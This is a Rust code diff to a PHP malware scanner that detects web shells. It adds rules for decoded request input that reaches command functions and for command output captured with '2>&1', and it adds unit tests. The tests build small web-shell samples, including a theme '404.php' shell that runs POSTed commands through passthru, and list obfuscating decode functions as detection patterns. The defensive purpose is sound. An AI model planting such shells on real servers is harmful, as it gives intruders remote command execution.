@@ -36,9 +36,10 @@ use std::sync::LazyLock;
 /// an older version is dropped after an upgrade instead of being reported or
 /// acted on: version 1 scored pictures with the PHP rules and called ordinary
 /// photos "malicious" (a few bytes of compressed data that spell `<?=`, plus the
-/// weight of a picture in `uploads`). Raise it whenever a change to the rules
-/// would make an earlier result misleading.
-pub const SCORER_VERSION: u32 = 2;
+/// weight of a picture in `uploads`); version 2 still called a library's comment
+/// (`phpQuery`) and PHPUnit's phar "malicious". Raise it whenever a change to the
+/// rules would make an earlier result misleading.
+pub const SCORER_VERSION: u32 = 3;
 
 fn s(parts: &[&str]) -> String {
     parts.concat()
@@ -207,9 +208,10 @@ fn args_window(low: &[u8], start: usize) -> &[u8] {
 }
 
 /// Names of variables assigned directly from request input
-/// (`$cmd = $_GET['c'];`). Capped so a hostile file cannot make this expensive.
-fn tainted_vars(low: &[u8]) -> Vec<Vec<u8>> {
-    let mut out: Vec<Vec<u8>> = Vec::new();
+/// (`$cmd = $_GET['c'];`), and whether it was decoded on the way. Capped so a
+/// hostile file cannot make this expensive.
+fn tainted_vars(low: &[u8]) -> Vec<(Vec<u8>, bool)> {
+    let mut out: Vec<(Vec<u8>, bool)> = Vec::new();
     let mut i = 0;
     while let Some(rel) = memchr::memchr(b'$', &low[i..]) {
         let start = i + rel + 1;
@@ -230,10 +232,10 @@ fn tainted_vars(low: &[u8]) -> Vec<Vec<u8>> {
             continue;
         }
         let name = &low[start..j];
-        if assigned_from_input(&low[k + 1..(k + 201).min(low.len())])
-            && !out.iter().any(|n| n == name)
+        if let Some(decoded) = assigned_from_input(&low[k + 1..(k + 201).min(low.len())])
+            && !out.iter().any(|(n, _)| n == name)
         {
-            out.push(name.to_vec());
+            out.push((name.to_vec(), decoded));
             if out.len() >= 64 {
                 break;
             }
@@ -262,47 +264,82 @@ const PASS_THROUGH: &[&[u8]] = &[
     b"htmlspecialchars_decode",
 ];
 
+/// Functions that hide what they are given: input passed through one of them and
+/// then to a command is the shape of a web shell that takes its command encoded.
+const DECODING: &[&[u8]] = &[
+    b"base64_decode",
+    b"hex2bin",
+    b"gzinflate",
+    b"str_rot13",
+    b"strrev",
+];
+
 /// Does the right-hand side of an assignment *begin with* request input, bare or
-/// through a pass-through function: `$_GET['c']`, `trim($_POST['c'])`? Starting
-/// with is the point: `isset($_GET['x']) ? 1 : 2` is a check, not a hand-over.
-fn assigned_from_input(rhs: &[u8]) -> bool {
+/// through pass-through functions: `$_GET['c']`, `trim($_POST['c'])`,
+/// `trim(base64_decode($_POST['c']))`? Starting with is the point:
+/// `isset($_GET['x']) ? 1 : 2` is a check, not a hand-over. `Some(true)` when
+/// a decoding function was on the way.
+fn assigned_from_input(rhs: &[u8]) -> Option<bool> {
     let skip = |s: &[u8]| -> usize {
         s.iter()
             .take_while(|b| matches!(**b, b' ' | b'\t' | b'@'))
             .count()
     };
-    let rhs = &rhs[skip(rhs)..];
-    let starts_with_source = |s: &[u8]| SOURCES.iter().any(|n| s.starts_with(n.as_bytes()));
-    if starts_with_source(rhs) {
-        return true;
+    let mut cur = &rhs[skip(rhs)..];
+    let mut decoded = false;
+    // A few wrappers at most.
+    for _ in 0..4 {
+        if SOURCES.iter().any(|n| cur.starts_with(n.as_bytes())) {
+            return Some(decoded);
+        }
+        let name_len = cur.iter().take_while(|&&b| is_ident(b)).count();
+        if name_len == 0
+            || cur.get(name_len) != Some(&b'(')
+            || !PASS_THROUGH.contains(&&cur[..name_len])
+        {
+            return None;
+        }
+        decoded |= DECODING.contains(&&cur[..name_len]);
+        let inner = &cur[name_len + 1..];
+        cur = &inner[skip(inner)..];
     }
-    let name_len = rhs.iter().take_while(|&&b| is_ident(b)).count();
-    if name_len == 0 || rhs.get(name_len) != Some(&b'(') {
-        return false;
-    }
-    if !PASS_THROUGH.contains(&&rhs[..name_len]) {
-        return false;
-    }
-    let inner = &rhs[name_len + 1..];
-    starts_with_source(&inner[skip(inner)..])
+    None
 }
 
 /// Does an argument use one of the tainted variables as a *value*? A variable
 /// used as an array key (`$registry[ $name ]`) is a lookup in a fixed table, not
-/// a hand-over, so it does not count.
-fn has_tainted(args: &[u8], tainted: &[Vec<u8>]) -> bool {
-    tainted.iter().any(|name| {
+/// a hand-over, so it does not count. `Some(decoded)` for the first one found.
+fn tainted_use(args: &[u8], tainted: &[(Vec<u8>, bool)]) -> Option<bool> {
+    tainted.iter().find_map(|(name, decoded)| {
         let mut pat = Vec::with_capacity(name.len() + 1);
         pat.push(b'$');
         pat.extend_from_slice(name);
-        memchr::memmem::find_iter(args, &pat).any(|p| {
-            if args.get(p + pat.len()).is_some_and(|&b| is_ident(b)) {
-                return false; // `$cmdline` is not `$cmd`
-            }
-            let before = args[..p].iter().rev().find(|b| !b.is_ascii_whitespace());
-            before != Some(&b'[')
-        })
+        memchr::memmem::find_iter(args, &pat)
+            .any(|p| {
+                if args.get(p + pat.len()).is_some_and(|&b| is_ident(b)) {
+                    return false; // `$cmdline` is not `$cmd`
+                }
+                let before = args[..p].iter().rev().find(|b| !b.is_ascii_whitespace());
+                before != Some(&b'[')
+            })
+            .then_some(*decoded)
     })
+}
+
+/// What follows the `(` of `$_GET['f'](`: the start of an argument list, not
+/// prose in a comment (`... means $_SERVER['HTTP_HOST'] (if any)`).
+fn looks_like_call_args(rest: &[u8]) -> bool {
+    let rest = rest.trim_ascii_start();
+    match rest.first() {
+        None => true,
+        Some(b'$' | b'\'' | b'"' | b')' | b'@' | b'&' | b'(' | b'[' | b'-' | b'!' | b'\\') => true,
+        Some(c) if c.is_ascii_digit() => true,
+        // A word is an argument only as a call: `trim(...)`, not `(if any)`.
+        Some(_) => {
+            let n = rest.iter().take_while(|&&b| is_ident(b)).count();
+            n > 0 && rest.get(n) == Some(&b'(')
+        }
+    }
 }
 
 /// `$_POST['f'](...)`: request input used as the *name of the function to call*.
@@ -310,14 +347,15 @@ fn input_called_as_function(low: &[u8]) -> Option<usize> {
     for src in SOURCES.iter().filter(|x| x.starts_with("$_")) {
         for off in memchr::memmem::find_iter(low, src.as_bytes()) {
             let from = off + src.len();
-            let tail = &low[from..(from + 40).min(low.len())];
+            let tail = &low[from..(from + 80).min(low.len())];
             let Some(close) = memchr::memchr(b']', tail) else {
                 continue;
             };
             // The bracket holds a plain key: no calls, no statements.
-            if tail[..close]
-                .iter()
-                .any(|b| matches!(b, b'(' | b')' | b';'))
+            if close > 40
+                || tail[..close]
+                    .iter()
+                    .any(|b| matches!(b, b'(' | b')' | b';'))
             {
                 continue;
             }
@@ -325,7 +363,7 @@ fn input_called_as_function(low: &[u8]) -> Option<usize> {
             while k < tail.len() && tail[k] == b' ' {
                 k += 1;
             }
-            if tail.get(k) == Some(&b'(') {
+            if tail.get(k) == Some(&b'(') && looks_like_call_args(&tail[k + 1..]) {
                 return Some(off);
             }
         }
@@ -394,12 +432,18 @@ pub fn score_php(content: &[u8], is_upload: bool, is_image_ext: bool) -> Score {
     // 1) Request input passed straight into a code/command call.
     let tainted = tainted_vars(&low);
     let mut direct: Option<usize> = None;
-    let mut via_var: Option<usize> = None;
+    // (offset, rule, weight) of the strongest use of a tainted variable.
+    let mut via_var: Option<(usize, &'static str, u32)> = None;
     for sink in SINKS.iter() {
         // For call_user_func*, only the FIRST argument (the function to run)
         // matters; the rest is data handed to a callback, which legitimate code
         // does with form values all the time.
         let callback_style = sink.starts_with("call_user_");
+        // The sinks that run a command, not code.
+        let command = !(sink.starts_with("ev")
+            || sink.starts_with("ass")
+            || sink.starts_with("create_")
+            || callback_style);
         for after in bare_calls(&low, sink) {
             let mut args = args_window(&low, after);
             if callback_style && let Some(comma) = memchr::memchr(b',', args) {
@@ -407,18 +451,31 @@ pub fn score_php(content: &[u8], is_upload: bool, is_image_ext: bool) -> Score {
             }
             if direct.is_none() && contains_any(args, &SOURCES) {
                 direct = Some(after);
-            } else if via_var.is_none() && has_tainted(args, &tainted) {
-                via_var = Some(after);
+            } else if let Some(decoded) = tainted_use(args, &tainted) {
+                // Input decoded on its way to a command, or a command that
+                // folds its errors into its output (`2>&1`) so a web page can
+                // show them: a shell. Anything else is only probably one.
+                let (rule, weight) = if decoded {
+                    ("decoded-to-sink", 100)
+                } else if command && memchr::memmem::find(args, b"2>&1").is_some() {
+                    ("tainted-command-capture", 100)
+                } else {
+                    ("tainted-to-sink", 70)
+                };
+                if via_var.is_none_or(|(_, _, w)| weight > w) {
+                    via_var = Some((after, rule, weight));
+                }
             }
         }
     }
     if let Some(off) = direct {
         add("source-to-sink", 100, Some(off));
-    } else if let Some(off) = via_var {
-        // Probably a shell, but legitimate code does this too (a backup plugin
-        // running a command built from a form field). On its own it lands at
-        // "suspicious": reported for a human, never auto-quarantined.
-        add("tainted-to-sink", 70, Some(off));
+    } else if let Some((off, rule, weight)) = via_var {
+        // The weaker case is probably a shell, but legitimate code does this
+        // too (a backup plugin running a command built from a form field). On
+        // its own it lands at "suspicious": reported for a human, never
+        // auto-quarantined.
+        add(rule, weight, Some(off));
     }
 
     // 2) `$_POST['f'](...)`: the request chooses which function runs.
@@ -529,6 +586,34 @@ pub fn score_php(content: &[u8], is_upload: bool, is_image_ext: bool) -> Score {
         verdict,
         hits,
         context,
+    }
+}
+
+/// Rules that, each on its own, show request input reaching code or a command.
+const STRONG_RULES: &[&str] = &[
+    "source-to-sink",
+    "input-as-function",
+    "decode-into-eval",
+    "preg_replace-e",
+    "decoded-to-sink",
+    "tainted-command-capture",
+];
+
+/// A file of test tooling (PHPUnit and its phar run commands by design) is not
+/// called "malicious" on weak signs added together (a command call, a variable
+/// that came from `$_SERVER`, a write to disk): that verdict makes `sn clean`
+/// quarantine it. It stays "suspicious", so a person still sees it. With a
+/// strong rule it keeps its verdict.
+pub fn cap_without_strong_rule(score: &mut Score) {
+    if score.verdict == Verdict::Malicious
+        && !score.hits.iter().any(|h| STRONG_RULES.contains(&h.rule))
+    {
+        score.verdict = Verdict::Suspicious;
+        score.score = score.score.min(99);
+        score.hits.push(Hit {
+            rule: "known-dev-tool",
+            weight: 0,
+        });
     }
 }
 
@@ -1344,6 +1429,100 @@ mod tests {
         assert_eq!(verdict(&open), Verdict::Malicious);
         let nested = cat(&["<?php ", "ev", "al(base64_decode(trim($_", "POST['x'])));"]);
         assert_eq!(verdict(&nested), Verdict::Malicious);
+    }
+
+    fn has(src: &[u8], rule: &str) -> bool {
+        score_php(src, false, false)
+            .hits
+            .iter()
+            .any(|h| h.rule == rule)
+    }
+
+    #[test]
+    fn prose_in_a_comment_is_not_input_called_as_a_function() {
+        // phpQuery's docblock, flagged "malicious" in the field.
+        let doc = cat(&[
+            "<?php class A { /** Dot '.' means $_",
+            "SERVER['HTTP_HOST'] (if any). */ public static $x = array('.'); }",
+        ]);
+        assert_eq!(verdict(&doc), Verdict::Clean);
+        // A real call keeps matching, whatever the first argument looks like.
+        for tail in [
+            "GET['f']('id');",
+            "GET['f'](\"id\");",
+            "REQUEST['f'](trim($x));",
+            "POST['f']($_POST['a']);",
+            "GET['f']();",
+            "GET['f'](@$a);",
+        ] {
+            let src = cat(&["<?php $_", tail]);
+            assert!(has(&src, "input-as-function"), "{tail}");
+        }
+    }
+
+    #[test]
+    fn a_command_on_decoded_input_is_a_shell() {
+        let plain = cat(&["<?php $c = $_", "POST['c']; sys", "tem($c);"]);
+        assert_eq!(verdict(&plain), Verdict::Suspicious);
+        let decoded = cat(&["<?php $c = base64_decode($_", "POST['c']); sys", "tem($c);"]);
+        assert!(has(&decoded, "decoded-to-sink"));
+        assert_eq!(verdict(&decoded), Verdict::Malicious);
+        // Through more than one wrapper.
+        let nested = cat(&[
+            "<?php $c = trim(base64_decode($_",
+            "POST['c'])); exe",
+            "c($c);",
+        ]);
+        assert_eq!(verdict(&nested), Verdict::Malicious);
+    }
+
+    #[test]
+    fn a_command_that_folds_its_errors_into_the_page_is_a_shell() {
+        // The theme `404.php` webshell found in the field.
+        let shell = cat(&[
+            "<?php $c = $_",
+            "POST['c']; if($c!==null){ob_start();@pass",
+            "thru($c.' 2>&1');$o=ob_get_clean();echo \"[S]\".$o.\"[E]\";} exit; ?>",
+        ]);
+        assert!(has(&shell, "tainted-command-capture"));
+        assert_eq!(verdict(&shell), Verdict::Malicious);
+        // Without the error folding it is the weaker, reported case.
+        let weaker = cat(&["<?php $c = $_", "POST['c']; pass", "thru($c);"]);
+        assert_eq!(verdict(&weaker), Verdict::Suspicious);
+        // A tool building its own command (PHPUnit) is neither.
+        let tool = cat(&[
+            "<?php $s = $_",
+            "SERVER['argv']; $p = proc_open($this->getCommand($s, $this->temp), $spec, $pipes);",
+        ]);
+        assert_eq!(verdict(&tool), Verdict::Suspicious);
+    }
+
+    #[test]
+    fn test_tooling_is_never_called_malicious_on_weak_signs_alone() {
+        // A command call, an argument from `$_SERVER` and a write to disk add up
+        // to 130: the verdict that makes `sn clean` quarantine PHPUnit's phar.
+        let weak = cat(&[
+            "<?php $s = $_",
+            "SERVER['argv']; $p = proc_open($this->cmd($s), $spec, $pipes); file_put_",
+            "contents($_",
+            "SERVER['x'], 'y');",
+        ]);
+        let mut s = score_php(&weak, false, false);
+        assert_eq!(s.verdict, Verdict::Malicious, "{:?}", s.hits);
+        assert!(s.score >= 100);
+        cap_without_strong_rule(&mut s);
+        assert_eq!(s.verdict, Verdict::Suspicious);
+        assert_eq!(s.score, 99);
+        assert!(s.hits.iter().any(|h| h.rule == "known-dev-tool"));
+        // With a strong rule in it, the verdict stays.
+        let mut strong = score_php(&cat(&["<?php ev", "al($_", "POST['x']);"]), false, false);
+        cap_without_strong_rule(&mut strong);
+        assert_eq!(strong.verdict, Verdict::Malicious);
+        // And what was not "malicious" is left alone.
+        let mut clean = score_php(b"<?php echo 1;", false, false);
+        cap_without_strong_rule(&mut clean);
+        assert_eq!(clean.verdict, Verdict::Clean);
+        assert!(clean.hits.is_empty());
     }
 
     #[test]
